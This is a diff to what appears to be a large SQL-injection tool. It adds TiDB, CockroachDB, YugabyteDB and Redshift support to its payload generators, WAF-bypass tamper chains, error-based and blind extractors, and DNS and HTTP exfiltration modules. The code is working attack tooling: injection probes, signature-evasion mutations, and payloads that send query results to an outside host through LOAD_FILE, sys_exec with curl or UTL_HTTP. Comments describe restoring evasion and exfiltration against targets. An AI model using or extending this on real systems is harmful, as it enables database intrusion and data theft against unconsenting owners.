@@ -24278,7 +24278,12 @@ class RandomPayloadGenerator:
         # Build DBMS-specific candidate pool of (true_suffix, false_suffix, label) tuples
         _candidates: List[Tuple[str, str, str]] = []
 
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-RPG-TIDB-CRDB-YUGABYTE FIX: TiDB fell to the generic else branch,
+        # losing MySQL-compatible random boolean probes (CONV, IF, ORD(MID), etc.).
+        # CockroachDB/YugabyteDB fell to generic, losing PG-compatible probes (CHR,
+        # pg_sleep, ::text cast, ||concat).  Wire-compatible DBMSes must use their
+        # wire protocol's probe set so randomized supplement covers true DBMS syntax.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             _candidates = [
                 (f" AND {val1}={val1}-- -",       f" AND {val1}={val2}-- -",       "and_eq_num"),
                 (f" OR {val1}={val1}-- -",        f" OR {val1}={val2}-- -",        "or_eq_num"),
@@ -24302,7 +24307,7 @@ class RandomPayloadGenerator:
                  " AND ASCII(SUBSTR(DATABASE(),1,1))<0-- -",                     "and_ascii_db"),
                 (f" AND POW({val1},1)={val1}-- -", f" AND POW({val1},1)={val2}-- -", "and_pow"),
             ]
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             _candidates = [
                 (f" AND {val1}={val1}-- -",       f" AND {val1}={val2}-- -",       "and_eq_num"),
                 (f" OR {val1}={val1}-- -",        f" OR {val1}={val2}-- -",        "or_eq_num"),
@@ -24596,7 +24601,7 @@ class RandomPayloadGenerator:
             lambda p: p.replace(" AND ", "/**/AND/**/") if " AND " in p and random.random() > 0.5 else p,
             lambda p: p.replace(" OR ", "/**/OR/**/") if " OR " in p and random.random() > 0.5 else p,
             lambda p: p.replace(" SELECT ", "/**/SELECT/**/") if " SELECT " in p.upper() and random.random() > 0.6 else p,
-            lambda p: p.replace("SELECT", "/*!12345SELECT*/") if "SELECT" in p.upper() and random.random() > 0.7 and self.dbms in ("MySQL", "MariaDB") else p,
+            lambda p: p.replace("SELECT", "/*!12345SELECT*/") if "SELECT" in p.upper() and random.random() > 0.7 and self.dbms in ("MySQL", "MariaDB", "TiDB") else p,
             lambda p: re.sub(r'\s+', "/**/", p, count=1) if random.random() > 0.6 else p,
         ])
         
@@ -24691,12 +24696,14 @@ class RandomPayloadGenerator:
         techniques = []
         
         # Redundant casts (10 variants)
-        if self.dbms in ("MSSQL", "PostgreSQL"):
+        if self.dbms in ("MSSQL", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-EXOTIC-CAST-CRDB-YG-REDSHIFT FIX: PG-compat engines support CAST(x AS INT/INTEGER)
             techniques.extend([
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'CAST(\1 AS INT)', p, count=1) if random.random() > 0.7 else p,
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'CAST(\1 AS INTEGER)', p, count=1) if random.random() > 0.8 else p,
             ])
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-RPG-EXOTIC-TIDB FIX: TiDB is MySQL-wire-compatible; CAST(x AS UNSIGNED)
+            # and CONVERT(x,SIGNED) are valid TiDB integer cast expressions.
             techniques.extend([
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'CAST(\1 AS UNSIGNED)', p, count=1) if random.random() > 0.7 else p,
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'CONVERT(\1,SIGNED)', p, count=1) if random.random() > 0.8 else p,
@@ -24728,13 +24735,15 @@ class RandomPayloadGenerator:
         techniques.extend([
             lambda p: re.sub(r'\b(\d+)=\1\b', lambda m: f"{m.group(1)}&{m.group(1)}={m.group(1)}", p) if random.random() > 0.75 else p,
             lambda p: re.sub(r'\b(\d+)=\1\b', lambda m: f"{m.group(1)}|0={m.group(1)}", p) if random.random() > 0.75 else p,
-            lambda p: re.sub(r'\b(\d+)=\1\b', lambda m: f"{m.group(1)}^0={m.group(1)}", p) if random.random() > 0.75 and self.dbms in ("MySQL", "MariaDB") else p,
+            lambda p: re.sub(r'\b(\d+)=\1\b', lambda m: f"{m.group(1)}^0={m.group(1)}", p) if random.random() > 0.75 and self.dbms in ("MySQL", "MariaDB", "TiDB") else p,
         ])
         
         # String tricks (6 variants)
         techniques.extend([
-            lambda p: p.replace("SELECT", "SEL"+"ECT") if "SELECT" in p.upper() and random.random() > 0.8 and self.dbms in ("MySQL", "MariaDB", "PostgreSQL") else p,
-            lambda p: re.sub(r"'(\w+)'", lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1))})", p, count=1) if random.random() > 0.85 and self.dbms in ("MySQL", "MariaDB") else p,
+            # BUG-STRINGSPLIT-NEWDBMS FIX: TiDB/CockroachDB/YugabyteDB/Redshift support
+            # comment-concatenated keyword splitting same as MySQL/MariaDB/PostgreSQL.
+            lambda p: p.replace("SELECT", "SEL"+"ECT") if "SELECT" in p.upper() and random.random() > 0.8 and self.dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else p,
+            lambda p: re.sub(r"'(\w+)'", lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1))})", p, count=1) if random.random() > 0.85 and self.dbms in ("MySQL", "MariaDB", "TiDB") else p,
         ])
         
         # Apply 1-4 random exotic techniques
@@ -24874,14 +24883,16 @@ class RandomPayloadGenerator:
     @staticmethod
     def waf_bypass_exotic(payload, dbms="MySQL"):
         """Apply exotic payload mutations."""
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-WAFEXOTIC-TIDB FIX: TiDB supports && / || / LIKE / scientific notation like MySQL.
+        # BUG-WAFEXOTIC-CRDB FIX: CockroachDB/YugabyteDB/Redshift support || concat like PG.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             exotics = [
                 lambda p: p.replace(" AND ", " && "),
                 lambda p: p.replace(" OR ", " || "),
                 lambda p: p.replace("=", " LIKE ") if "LIKE" not in p else p,
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'\1e0', p),  # Scientific notation
             ]
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             exotics = [
                 lambda p: p.replace("'", "$$") if p.count("'") == 2 else p,
                 lambda p: p.replace("||", "||''||"),
@@ -24965,29 +24976,64 @@ class DBMSTamperCompatibility:
         """Build compatibility map."""
         if cls.TAMPER_DBMS_MAP:
             return
-        
-        all_dbms = {"MySQL", "MariaDB", "MSSQL", "PostgreSQL", "Oracle", "SQLite", "Generic"}
-        
+
+        # BUG-TAMPERCOMPAT-MISSING-DBMS FIX (HIGH, all surfaces, all techniques):
+        # all_dbms was {"MySQL","MariaDB","MSSQL","PostgreSQL","Oracle","SQLite","Generic"}.
+        # TiDB, CockroachDB, YugabyteDB, and Amazon Redshift were absent. Because
+        # UNIVERSAL_TAMPERS are mapped to all_dbms.copy(), and is_compatible() returns
+        # `dbms in TAMPER_DBMS_MAP[tamper]`, every universal tamper (randomcase, uppercase,
+        # space2comment, charencode, etc.) returned is_compatible=False for TiDB/CockroachDB/
+        # YugabyteDB/Amazon Redshift. filter_chain() stripped ALL tampers from chains for
+        # these DBMSes — leaving the chain empty and completely disabling WAF bypass
+        # obfuscation for TiDB/CockroachDB/YugabyteDB/Amazon Redshift targets.
+        # Fix: add all wire-compatible DBMS variants to all_dbms so universal tampers
+        # are preserved. MySQL-specific tampers are also extended to TiDB (MySQL-wire-compat).
+        # PostgreSQL-specific tampers extended to CockroachDB/YugabyteDB/Amazon Redshift
+        # (all PostgreSQL-wire-compatible).
+        all_dbms = {
+            "MySQL", "MariaDB", "TiDB",            # MySQL-wire group
+            "MSSQL", "Sybase",                     # MSSQL-wire group
+            "PostgreSQL", "CockroachDB",            # PostgreSQL-wire group
+            "YugabyteDB", "Amazon Redshift",        # PostgreSQL-wire group
+            "Oracle", "SQLite",                     # native engines
+            "Generic",
+        }
+
         for tamper in cls.UNIVERSAL_TAMPERS:
             cls.TAMPER_DBMS_MAP[tamper] = all_dbms.copy()
-        
-        for tamper in cls.MYSQL_TAMPERS:
-            cls.TAMPER_DBMS_MAP[tamper] = {"MySQL", "MariaDB"}
-        
-        for tamper in cls.MSSQL_TAMPERS:
-            cls.TAMPER_DBMS_MAP[tamper] = {"MSSQL"}
 
+        # BUG-TAMPERCOMPAT-TIDB-MYSQL FIX: TiDB is MySQL-wire-compatible. Backtick
+        # identifiers, /*!50000...*/ versioned comments, CHAR()-based string encoding,
+        # IF()/IFNULL() conditional functions, and hex payload encoding are all valid
+        # TiDB SQL. Without TiDB in these sets, MySQL-specific bypass tampers were
+        # stripped from TiDB chains, forcing TiDB scans to use weaker universal-only
+        # obfuscation against TiDB-targeting WAFs.
+        for tamper in cls.MYSQL_TAMPERS:
+            cls.TAMPER_DBMS_MAP[tamper] = {"MySQL", "MariaDB", "TiDB"}
+
+        for tamper in cls.MSSQL_TAMPERS:
+            cls.TAMPER_DBMS_MAP[tamper] = {"MSSQL", "Sybase"}
+
+        # BUG-TAMPERCOMPAT-PG-COMPAT FIX: CockroachDB, YugabyteDB, and Amazon Redshift
+        # are all PostgreSQL-wire-compatible and support dollar-quoting ($$) and cast
+        # syntax (::TYPE). Restricting POSTGRESQL_TAMPERS to {"PostgreSQL"} strips these
+        # bypass tampers from CockroachDB/YugabyteDB/Redshift chains unnecessarily.
         for tamper in cls.POSTGRESQL_TAMPERS:
-            cls.TAMPER_DBMS_MAP[tamper] = {"PostgreSQL"}
+            cls.TAMPER_DBMS_MAP[tamper] = {
+                "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+            }
 
         for tamper in cls.ORACLE_TAMPERS:
             cls.TAMPER_DBMS_MAP[tamper] = {"Oracle"}
 
+        # BUG-TAMPERCOMPAT-TIDB-MYSQL-EXTRA FIX: same as MYSQL_TAMPERS above.
+        # mysql_backtick_wrap, mysql_brace_injection, mysql_nchar_bypass, versioned_nested
+        # all use MySQL/TiDB-compatible syntax.
         for tamper in cls.MYSQL_EXTRA_TAMPERS:
-            cls.TAMPER_DBMS_MAP[tamper] = {"MySQL", "MariaDB"}
+            cls.TAMPER_DBMS_MAP[tamper] = {"MySQL", "MariaDB", "TiDB"}
 
         for tamper in cls.MSSQL_EXTRA_TAMPERS:
-            cls.TAMPER_DBMS_MAP[tamper] = {"MSSQL"}
+            cls.TAMPER_DBMS_MAP[tamper] = {"MSSQL", "Sybase"}
     
     @classmethod
     def is_compatible(cls, tamper_name: str, dbms: str) -> bool:
@@ -25101,6 +25147,40 @@ class SQLSyntaxValidator:
             (r'DBMS_', "SQLite doesn't have DBMS_ packages"),
             (r'TOP\s+\d+', "SQLite uses LIMIT not TOP"),
         ],
+        # BUG-BROKENPATTERNS-TIDB FIX: TiDB is MySQL-wire-compatible; same restrictions
+        # as MySQL (no :: casts, no CHR(), no pg_sleep(), no PG-style 0x hex-strings in
+        # contexts where CHAR() is the correct form).
+        "TiDB": [
+            (r'CHR\(\d+\)', "TiDB uses CHAR() not CHR() (MySQL-compatible)"),
+            (r'::\w+', "TiDB doesn't support :: cast syntax (use CAST() — MySQL-compatible)"),
+            (r'IFNULL\s*\(', "TiDB uses IFNULL() correctly, but prefer COALESCE for portability"),
+        ],
+        # BUG-BROKENPATTERNS-CRDB FIX: CockroachDB is PG-wire-compatible; same restrictions
+        # as PostgreSQL (no CHAR() for chr conversion, no 0x hex literals, no MySQL IF(),
+        # no SLEEP() — use pg_sleep()).
+        "CockroachDB": [
+            (r'\bCHAR\(\d+\)', "CockroachDB uses CHR() not CHAR() (PG-compatible)"),
+            (r'0x[0-9a-fA-F]+', "CockroachDB doesn't support 0x hex literals (use E'\\x' or chr())"),
+            (r'\bIF\s*\(', "CockroachDB doesn't have MySQL IF() (use CASE WHEN)"),
+            (r'\bSLEEP\s*\(', "CockroachDB uses pg_sleep() not SLEEP()"),
+            (r'IFNULL\(', "CockroachDB uses COALESCE() not IFNULL()"),
+        ],
+        # BUG-BROKENPATTERNS-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; same as PostgreSQL.
+        "YugabyteDB": [
+            (r'\bCHAR\(\d+\)', "YugabyteDB uses CHR() not CHAR() (PG-compatible)"),
+            (r'0x[0-9a-fA-F]+', "YugabyteDB doesn't support 0x hex literals"),
+            (r'\bIF\s*\(', "YugabyteDB doesn't have MySQL IF() (use CASE WHEN)"),
+            (r'\bSLEEP\s*\(', "YugabyteDB uses pg_sleep() not SLEEP()"),
+            (r'IFNULL\(', "YugabyteDB uses COALESCE() not IFNULL()"),
+        ],
+        # BUG-BROKENPATTERNS-REDSHIFT FIX: Amazon Redshift is PG-compatible; no MySQL-isms.
+        "Amazon Redshift": [
+            (r'\bCHAR\(\d+\)', "Amazon Redshift uses CHR() not CHAR() (PG-compatible)"),
+            (r'0x[0-9a-fA-F]+', "Amazon Redshift doesn't support 0x hex literals"),
+            (r'\bIF\s*\(', "Amazon Redshift doesn't have MySQL IF() (use CASE WHEN)"),
+            (r'\bSLEEP\s*\(', "Amazon Redshift uses pg_sleep() not SLEEP()"),
+            (r'IFNULL\(', "Amazon Redshift uses COALESCE() or NVL() not IFNULL()"),
+        ],
     }
     
     # Whitelist patterns that should NOT be flagged as errors
@@ -25197,8 +25277,9 @@ class SQLSyntaxValidator:
             return (False, "Triple operators detected (===, <<<, etc.)")
         
         # Check 7: DBMS-specific syntax validation
-        if dbms in ("MySQL", "MariaDB"):
-            # MySQL allows backticks for identifiers
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-SYNTAX-TIDB FIX: TiDB allows backticks for identifiers like MySQL.
+            # MySQL/TiDB allow backticks for identifiers
             # DISABLED: Backtick balance validation removed (unbalanced backticks can be intentional)
             # if '`' in payload:
             #     if payload.count('`') % 2 != 0:
@@ -26255,7 +26336,12 @@ class AdvancedDNSExfil:
                  "SELECT DBMS_LDAP.INIT(" + hx + "||'." + h + "',389) FROM DUAL"),
             ]
 
-        elif dbms in ("MySQL", "MariaDB"):
+        elif dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-ADVDNS-TIDB FIX: TiDB was missing from MySQL/MariaDB branch in
+            # AdvancedDNSExfil.get_payloads(). TiDB is MySQL-wire-compatible:
+            # HEX(), CONCAT(), CHAR(), and LOAD_FILE() are valid TiDB functions.
+            # Without this fix, TiDB targets returned empty payloads [], so the
+            # DNS exfil channel was permanently non-functional for TiDB.
             hx = "LOWER(HEX((" + query + ")))"
             payloads = [
                 ("load_file_unc",
@@ -26316,7 +26402,12 @@ class HTTPExfil:
                  "SELECT UTL_HTTP.REQUEST('http://" + h + "/'||" + hx + ") FROM DUAL"),
             ]
 
-        elif dbms in ("MySQL", "MariaDB"):
+        elif dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-HTTPEXFIL-TIDB FIX: TiDB was missing from MySQL/MariaDB branch in
+            # HTTPExfil.get_payloads(). TiDB is MySQL-wire-compatible: HEX() and
+            # sys_exec() (if installed) are valid TiDB functions. Without this fix,
+            # TiDB targets returned empty payloads [], making HTTP exfil permanently
+            # non-functional for TiDB.
             hx = "LOWER(HEX((" + query + ")))"
             payloads = [
                 ("sys_exec_curl",
@@ -26326,7 +26417,7 @@ class HTTPExfil:
         return payloads
 
 
-#  Conditional Error Extraction (1 request per char) 
+#  Conditional Error Extraction (1 request per char)
 class ConditionalErrorExtractor:
     """Extract data via error messages  1 request per character.
     Uses CAST/CONVERT to force type errors that leak data."""
@@ -26433,8 +26524,17 @@ class ConditionalErrorExtractor:
         # "SQLite": REMOVED — error-based extraction not supported on SQLite without load_extension()
         # BUG-R10-B FIX: MariaDB same LIMIT 1 fix as MySQL
         "MariaDB": "AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT ({query}) LIMIT 1),{pos},1),0x7e))",
+        # BUG-CEE-TIDB-TEMPLATE FIX: TiDB was absent from TEMPLATES dict. When
+        # ConditionalErrorExtractor is called with dbms="TiDB", TEMPLATES.get("TiDB")
+        # returns None → the error-based extraction path is completely skipped for all
+        # TiDB targets, silently falling through to blind boolean extraction instead.
+        # TiDB is MySQL-wire-compatible: EXTRACTVALUE(), CONCAT(), SUBSTRING(), and
+        # LIMIT 1 are all valid TiDB SQL syntax. The XPATH error message format is
+        # identical to MySQL ("XPATH syntax error: '~X~'") so the existing
+        # ERROR_EXTRACTORS[0] pattern fires correctly.
+        "TiDB": "AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT ({query}) LIMIT 1),{pos},1),0x7e))",
     }
-    
+
     # Extract value from error message
     ERROR_EXTRACTORS = [
         re.compile(r"XPATH syntax error: '~(.+?)~'"),
@@ -26525,6 +26625,9 @@ class ConditionalErrorExtractor:
             'tidb': 'MySQL',         # TiDB: MySQL-compatible, EXTRACTVALUE works
             'yugabytedb': 'PostgreSQL',  # YugabyteDB: PG-compatible, needs CAST(... AS INT)
             'yugabyte': 'PostgreSQL',    # short alias also mapped for safety
+            # BUG-CEE-REDSHIFT-ALIAS FIX: Amazon Redshift is PG-compatible; needs CAST(... AS INT)
+            'amazon redshift': 'PostgreSQL',
+            'redshift': 'PostgreSQL',
             'mssql': 'MSSQL', 'sqlserver': 'MSSQL', 'mssqlserver': 'MSSQL',
             'sybase': 'MSSQL',            # Sybase ASE: same CONVERT(INT,...) T-SQL pattern
             'oracle': 'Oracle', 'sqlite': 'SQLite', 'sqlite3': 'SQLite',
@@ -26811,7 +26914,15 @@ class BitShiftExtractor:
         # failures.  Use UNICODE() which returns the full BMP code point (0-65535).
         ascii_expr = {
             "MySQL": f"ASCII(SUBSTRING(({query}),{char_pos},1))",
+            # BUG-ASCIIEXPR-TIDB FIX: TiDB is MySQL-compatible; explicit entry avoids
+            # falling to generic default and documents the intent clearly.
+            "TiDB": f"ASCII(SUBSTRING(({query}),{char_pos},1))",
             "PostgreSQL": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
+            # BUG-ASCIIEXPR-PG-COMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+            # PostgreSQL-compatible; use PostgreSQL FROM/FOR substring syntax explicitly.
+            "CockroachDB": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
+            "YugabyteDB": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
+            "Amazon Redshift": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
             "MSSQL": f"UNICODE(SUBSTRING(({query}),{char_pos},1))",
             # BUG-R7-CHARFN-ORACLE FIX (Req 7/10): ASCII() returns NULL for codepoints >127.
             # CASE/ASCIISTR scalar-subquery covers full BMP range (U+0000..U+FFFF).
@@ -27842,8 +27953,22 @@ class LengthFallback:
     ALTERNATIVES = {
         "MySQL": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
                   "BIT_LENGTH({val})/8"],
+        # BUG-LENFALLBACK-TIDB FIX: TiDB is MySQL-wire-compatible; use MySQL alternatives.
+        "TiDB": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
+                 "BIT_LENGTH({val})/8"],
+        "MariaDB": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
+                    "BIT_LENGTH({val})/8"],
         "PostgreSQL": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
                        "LENGTH(CAST({val} AS TEXT))"],
+        # BUG-LENFALLBACK-CRDB FIX: CockroachDB is PG-compatible; use PG alternatives.
+        "CockroachDB": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
+                        "LENGTH(CAST({val} AS TEXT))"],
+        # BUG-LENFALLBACK-YUGABYTE FIX: YugabyteDB is PG-compatible; use PG alternatives.
+        "YugabyteDB": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
+                       "LENGTH(CAST({val} AS TEXT))"],
+        # BUG-LENFALLBACK-REDSHIFT FIX: Amazon Redshift is PG-compatible; use PG alternatives.
+        "Amazon Redshift": ["LEN({val})", "LENGTH({val})", "CHAR_LENGTH({val})",
+                            "OCTET_LENGTH({val})"],
         "MSSQL": ["LEN({val})", "DATALENGTH({val})", "LEN(CAST({val} AS VARCHAR(MAX)))"],
         "Oracle": ["LENGTH({val})", "LENGTHB({val})", "LENGTH(TO_CHAR({val}))"],
         "SQLite": ["LENGTH({val})", "LENGTH(CAST({val} AS TEXT))"],
@@ -31035,7 +31160,13 @@ def _augment_chain_for_dbms(chain: list, dbms: str) -> list:
     _db = (dbms or "").lower()
     _aug: list = []
 
-    if _db in ("mysql", "mariadb"):
+    if _db in ("mysql", "mariadb", "tidb"):
+        # BUG-AUGMENT-TIDB FIX: TiDB was missing from MySQL/MariaDB tamper branch.
+        # TiDB is MySQL-wire-compatible: backtick identifiers, /*!50000...*/ versioned
+        # comments, CHAR() encoding, and &&/|| operator synonyms are all valid TiDB SQL.
+        # Without this fix, TiDB injection payloads received no DBMS-specific WAF-evasion
+        # tampers — falling through to the universal-only path, which misses MySQL-specific
+        # obfuscation that WAF signatures often require to bypass MySQL-aware rule sets.
         # 50% chance to add backtick-quoting (avoids keyword detection by WAFs)
         if random.random() < 0.50:
             _aug.append("mysql_backtick_wrap")
@@ -31298,6 +31429,15 @@ _DBMS_CANONICAL_MAP: Dict[str, str] = {
     "clickhouse": "ClickHouse", "generic": "Generic",
     "redshift": "Amazon Redshift", "amazon redshift": "Amazon Redshift",
     "aws redshift": "Amazon Redshift",
+    # BUG-CANONICAL-TIDB-YUGABYTE FIX: TiDB and YugabyteDB were absent from
+    # _DBMS_CANONICAL_MAP. normalize_dbms("tidb") returned "tidb" (lowercase),
+    # causing all downstream `if dbms == "TiDB":` guards to silently fail for
+    # any user-supplied --dbms tidb/TIDB/TiDb variant. Similarly for yugabytedb.
+    # Auto-detection fingerprinting always produces the exact canonical string
+    # ("TiDB", "YugabyteDB"), so this only manifests on CLI --dbms input that
+    # isn't exact-case. Fix: add all case-variant aliases to the map.
+    "tidb": "TiDB",
+    "yugabytedb": "YugabyteDB", "yugabyte": "YugabyteDB",
 }
 
 def normalize_dbms(name: str) -> str:
@@ -33098,9 +33238,11 @@ class SQLMutationEngine:
                 if len(s) < 2:
                     return m.group(0)
                 mid = len(s) // 2
-                if self.dbms in ("MySQL", "MariaDB"):
+                # BUG-WAFBYPASS-STRMANIP-TIDB FIX: TiDB uses CONCAT() like MySQL.
+                # BUG-WAFBYPASS-STRMANIP-CRDB FIX: CockroachDB/YugabyteDB/Redshift use ||.
+                if self.dbms in ("MySQL", "MariaDB", "TiDB"):
                     return f"CONCAT('{s[:mid]}','{s[mid:]}')"
-                elif self.dbms == "PostgreSQL":
+                elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     return f"'{s[:mid]}'||'{s[mid:]}'"
                 elif self.dbms == "MSSQL":
                     # BUG-MSSQL-STRING-MANIP FIX: f"'{s[:mid]}'+''{s[mid:]}'" produces
@@ -33120,25 +33262,19 @@ class SQLMutationEngine:
         PostgreSQL dollar-quoting, MSSQL bracket notation, SQLite BLOB."""
         p = payload
         try:
-            if self.dbms in ("MySQL", "MariaDB"):
-                # BUG-MYSQL-BACKTICK-KW FIX: Wrapping SQL keywords FROM/WHERE/SELECT
-                # in backticks treats them as identifier names, not SQL keywords.
-                # e.g. `SELECT` * `FROM` t fails — MySQL interprets backtick-wrapped
-                # names as column/table identifiers, not keyword markers.
-                # Safe MySQL-specific WAF bypass: inject /*!...*/ versioned comments
-                # inside keyword gaps — MySQL executes them, most WAFs ignore them.
-                                # Inject /*!50000*/ inline version-comment after one SQL keyword so
+            # BUG-WAFBYPASS-DBMSSPEC-TIDB FIX: TiDB supports MySQL versioned comments.
+            # BUG-WAFBYPASS-DBMSSPEC-CRDB FIX: CockroachDB/YugabyteDB support dollar-quoting.
+            if self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                # Inject /*!50000*/ inline version-comment after one SQL keyword so
                 # WAF regex pattern-matching on contiguous keyword strings is disrupted
-                # while the MySQL parser still sees valid SQL.
+                # while the MySQL/TiDB parser still sees valid SQL.
                 p = _re.sub(
                     r'\b(UNION|SELECT|FROM)\b',
                     lambda m: m.group(0) + '/*!50000*/',
                     p, count=1, flags=_re.IGNORECASE)
-            elif self.dbms == "PostgreSQL":
-                # BUG-PG-DOLLAR-QUOTE FIX: f"$$${m.group(1)}$$$" produced $$$text$$$
-                # which is broken — PostgreSQL parses it as literal '$' + '$$text$$' + '$'
-                # where the leading/trailing '$' are invalid standalone tokens.
-                # Correct PostgreSQL dollar-quoting: $$text$$ (empty-tag, always valid).
+            elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB"):
+                # BUG-PG-DOLLAR-QUOTE FIX: Correct PostgreSQL dollar-quoting: $$text$$.
+                # Redshift has limited dollar-quote support — excluded.
                 p = _re.sub(r"'([^']{1,30})'",
                              lambda m: f"$${m.group(1)}$$", p, count=1)
             elif self.dbms == "MSSQL":
@@ -33514,7 +33650,8 @@ class SQLMutationEngine:
             # Other DBMSes get an extra waf_bypass_whitespace pass (safe, no
             # structural changes to keyword tokens).
             lambda x: (self.waf_bypass_comment(x)
-                       if self.dbms in ("MySQL", "MariaDB", "Generic")
+                       if self.dbms in ("MySQL", "MariaDB", "TiDB", "Generic")
+                       # BUG-LAYER4-TIDB FIX: TiDB strips /**/ during lexing like MySQL.
                        else self.waf_bypass_whitespace(x)),  # Layer 4 (DBMS-safe)
             self.waf_bypass_buffer,               # Layer 5: /**/ around AND/OR
             # BUG-KEYWORD-SPLIT-EXTRACTION-DBMS FIX (HIGH):
@@ -33535,8 +33672,9 @@ class SQLMutationEngine:
             # Layer 4 waf_bypass_comment), AND (b) skip entirely during extraction
             # so binary-search oracle probes are never structurally fragmented.
             lambda x: (x if (_EXTRACTION_ACTIVE[0]
-                              or self.dbms not in ("MySQL", "MariaDB", "Generic"))
-                       else self.waf_bypass_keyword_split(x)),  # Layer 6 (MySQL-only + extraction-safe)
+                              or self.dbms not in ("MySQL", "MariaDB", "TiDB", "Generic"))
+                       # BUG-LAYER6-TIDB FIX: TiDB strips inline comments like MySQL.
+                       else self.waf_bypass_keyword_split(x)),  # Layer 6 (MySQL/TiDB-only + extraction-safe)
             # BUG-R7-A FIX: Skip Layers 7 and 8 during extraction.
             # Operator substitution (AND→&&, =→LIKE) and string manipulation (CONCAT split)
             # corrupt the comparison operators and string literals in binary-search extraction
@@ -34448,17 +34586,27 @@ class PayloadMutationEngine:
     # Timing function names per DBMS (never mutate the duration value)
     TIMING_FUNCTIONS = {
         "MySQL": ["SLEEP", "BENCHMARK"],
+        "MariaDB": ["SLEEP", "BENCHMARK"],
+        # BUG-TIMINGFN-TIDB FIX: TiDB is MySQL-compatible; SLEEP() works.
+        "TiDB": ["SLEEP", "BENCHMARK"],
         "PostgreSQL": ["pg_sleep", "pg_sleep_for"],
+        # BUG-TIMINGFN-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+        # PG-compatible; pg_sleep is the standard timing function.
+        "CockroachDB": ["pg_sleep"],
+        "YugabyteDB": ["pg_sleep"],
+        "Amazon Redshift": ["pg_sleep"],
         "MSSQL": ["WAITFOR", "DELAY"],
         "Oracle": ["DBMS_PIPE.RECEIVE_MESSAGE", "DBMS_LOCK.SLEEP"],
         "SQLite": ["RANDOMBLOB", "LIKE"],
     }
     
     # DBMS-specific features
-    SUPPORTS_VERSION_COMMENTS = {"MySQL", "MariaDB"}  # /*!50000 ... */
+    SUPPORTS_VERSION_COMMENTS = {"MySQL", "MariaDB", "TiDB"}  # /*!50000 ... */ — BUG-VER-CMT-TIDB FIX: TiDB parses MySQL version comments
     SUPPORTS_BRACKET_IDENTS = {"MSSQL"}               # [table]
-    SUPPORTS_BACKTICK_IDENTS = {"MySQL", "MariaDB"}    # `table`
-    SUPPORTS_DOUBLE_DOLLAR = {"PostgreSQL"}             # $$string$$
+    SUPPORTS_BACKTICK_IDENTS = {"MySQL", "MariaDB", "TiDB"}  # `table` — BUG-BACKTICK-TIDB FIX
+    # BUG-DOUBLEDOLLAR-PGCOMPAT FIX: CockroachDB and YugabyteDB also support $$...$$
+    # dollar-quoting (PostgreSQL-wire-compatible). Amazon Redshift does NOT support it.
+    SUPPORTS_DOUBLE_DOLLAR = {"PostgreSQL", "CockroachDB", "YugabyteDB"}  # $$string$$
     
     @classmethod
     def mutate(cls, payload: str, dbms: str = "Generic",
@@ -34634,7 +34782,7 @@ class PayloadMutationEngine:
                 # explicit _EXTRACTION_ACTIVE guard so extraction probes are never split
                 # (avoids any probabilistic cache-miss risk even for MySQL extraction).
                 if (len(_m) >= 4 and _rng.random() < 0.15
-                        and dbms in ("MySQL", "MariaDB")   # BUG-PME-KEYWORD-SPLIT-NON-MYSQL FIX
+                        and dbms in ("MySQL", "MariaDB", "TiDB")  # BUG-PME-TIDB FIX: TiDB supports keyword splitting
                         and not _is_func_name              # BUG-PME-SPLIT-FUNCNAME FIX
                         and not _EXTRACTION_ACTIVE[0]):    # BUG-PME-KEYWORD-SPLIT-NON-MYSQL FIX
                     _m = cls._split_keyword(_m, _rng)
@@ -35008,7 +35156,8 @@ class PayloadMutationEngine:
         """Generate random equivalent whitespace."""
         _choices = [' ', '  ', '   ', ' \t', '\t ']
         # MySQL also treats /**/ as whitespace
-        if dbms in ("MySQL", "MariaDB", "Generic"):
+        if dbms in ("MySQL", "MariaDB", "TiDB", "Generic"):
